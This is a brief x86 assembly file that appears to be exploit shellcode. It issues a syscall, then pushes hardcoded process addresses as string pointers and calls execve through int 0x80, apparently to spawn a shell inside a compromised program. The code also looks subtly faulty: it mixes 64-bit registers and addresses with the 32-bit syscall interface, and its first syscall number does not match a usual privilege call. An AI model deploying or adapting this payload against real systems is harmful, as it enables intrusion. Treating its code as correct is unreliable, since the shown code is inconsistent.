section .text	;
global _start	;

_start:		;
xor rax, rax	;
mov rax, 0x91	;
xor rbx, rbx	;
xor rcx, rcx	;
int 0x80	;

xor rax, rax	;
push rax	;
push 0x55555555472c	;
push 0x555555554724	;
mov rbx, rsp	;
push rax	;
push rbx	;
mov rcx, rsp	;
xor rdx, rdx	;
mov rax, 0xb	;
int 0x80	;
